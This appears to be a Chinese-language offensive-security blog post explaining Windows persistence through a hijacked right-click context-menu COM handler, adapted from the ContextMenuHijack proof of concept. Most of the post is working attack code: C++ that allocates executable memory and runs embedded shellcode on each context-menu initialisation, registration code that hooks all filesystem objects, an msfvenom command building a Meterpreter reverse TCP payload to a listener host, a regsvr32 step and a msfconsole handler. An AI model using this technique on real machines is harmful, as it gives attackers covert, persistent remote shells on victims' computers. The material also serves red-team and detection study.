---
layout: post
title: 持久化 - 上下文菜单
date: '2023-03-29 16:12:57'
tags:
- persistence
---

上下文菜单为用户提供了快捷方式，以执行许多操作。上下文菜单通过右键单击调用，对于每个 Windows 用户来说，这是一个非常常见的操作。在攻击性操作中，通过在用户尝试使用上下文菜单时执行 shellcode，可以将此操作武器化以实现持久化。

[RistBS](https://twitter.com/RistBS) 开发了一个名为 [ContextMenuHijack](https://github.com/RistBS/ContextMenuHijack) 的 POC，可以通过注册 COM 对象利用上下文菜单实现持久化。使用“VirtualAlloc”函数以分配存储可执行的 shellcode 的内存区域。

    void InjectShc() 
    {
        DWORD dwOldProtect = 0;
        LPVOID addr = VirtualAlloc( NULL, sizeof( buf ), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );
        memcpy( addr, buf, sizeof( buf ) );
     
        VirtualProtect( addr, sizeof( buf ), PAGE_EXECUTE_READ, &dwOldProtect );
     
        ( ( void( * )() )addr )();
    }

<img src="assets/img/blog/imported/persistence-Context-Menu---VirtualAlloc.png" class="kg-image" alt loading="lazy" ><figcaption>Context Menu – VirtualAlloc</figcaption>

下面的代码用于接收有关用户将要选择的组件的信息，“CreateThread”将创建一个新线程来执行 shellcode。

    // 此函数通过创建新线程并注入shellcode来初始化上下文菜单扩展。 
    // 它还检查数据对象是否为空，如果为空，则返回S_OK。 
    IFACEMETHODIMP FileContextMenuExt::Initialize( LPCITEMIDLIST pidlFolder, LPDATAOBJECT pDataObj, HKEY hKeyProgID )
    {
        DWORD tid = NULL;
        CreateThread( NULL, 1024 * 1024, ( LPTHREAD_START_ROUTINE )InjectShc, NULL, 0, &tid );
     
        if ( NULL == pDataObj ) {
                    if ( pidlFolder != NULL ) {
                    }
            return S_OK;
        }
            return S_OK;
    }

<img src="assets/img/blog/imported/persistence-Context-Menu---Initialize---CreateThread.png" class="kg-image" alt loading="lazy" ><figcaption>Context Menu – Initialize &amp; CreateThread</figcaption>

“QueryInterface”方法将查询接口集合的对象。

    IFACEMETHODIMP FileContextMenuExt::QueryInterface(REFIID riid, void **ppv)
    {
        // 定义 QITAB 数组，用于存储 COM 接口
        static const QITAB qit[] = 
        {
            QITABENT( FileContextMenuExt, IContextMenu ), // 右键菜单接口
            QITABENT( FileContextMenuExt, IContextMenu2 ), // 右键菜单接口 2
            QITABENT( FileContextMenuExt, IContextMenu3 ), // 右键菜单接口 3
            QITABENT( FileContextMenuExt, IShellExtInit ), // Shell 扩展接口
            { 0 },
        };
        // 调用 QISearch 方法，查找指定的 COM 接口
        return QISearch( this, qit, riid, ppv );
    }

<img src="assets/img/blog/imported/persistence-Context-Menu---QueryInterface-1.png" class="kg-image" alt loading="lazy" ><figcaption>Context Menu – QueryInterface</figcaption>

上下文菜单处理程序将被注册为 COM 对象，因此将调用“RegisterInprocServer”函数。

        // 注册上下文菜单扩展
        // 将当前模块注册为一个 in-process COM 服务器
        hr = RegisterInprocServer( szModule, CLSID_FileContextMenuExt, L"ContextMenuHijack.FileContextMenuExt Class", L"Apartment" );
        if ( SUCCEEDED( hr ) ) {
            // 将当前对象注册为所有文件系统对象的上下文菜单处理程序
            hr = RegisterShellExtContextMenuHandler( L"AllFilesystemObjects", CLSID_FileContextMenuExt, L"ContextMenuHijack.FileContextMenuExt" );
        }
             
        return hr;
    }

<img src="assets/img/blog/imported/persistence-Context-Menu---RegisterInprocServer.png" class="kg-image" alt loading="lazy" ><figcaption>Context Menu – RegisterInprocServer</figcaption>

使用 Metasploit 框架的“msfvenom”生成 shellcode 并写入文本文件中。

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=4444 EXITFUNC=thread -f c > shellcode.txt`

<img src="assets/img/blog/imported/persistence-Context-Menu-msfvenom-shellcode.png" class="kg-image" alt loading="lazy">

将 shellcode 放到代码中，代码编译完成，将生成一个 DLL。使用程序“regsvr32”将 DLL 注册到操作系统中。

<img src="assets/img/blog/imported/persistence-Context-Menu---DLL-Register-Server.png" class="kg-image" alt loading="lazy" ><figcaption>Context Menu – DLL Register Server</figcaption>

`regsvr32 ContextMenuHijack.dll`

使用 msfconsole 进行监听，一旦用户在 Windows 环境中对对象（文件或文件夹）执行右键单击操作，代码将被执行，并建立通信通道。

    $ msfconsole
    msf6 > use exploit/multi/handler
    msf6 > set LHOST 10.211.55.2
    msf6 > run

## References

> https://github.com/RistBS/ContextMenuHijack  
> https://ristbs.github.io/2023/02/15/hijack-explorer-context-menu-for-persistence-and-fun.html

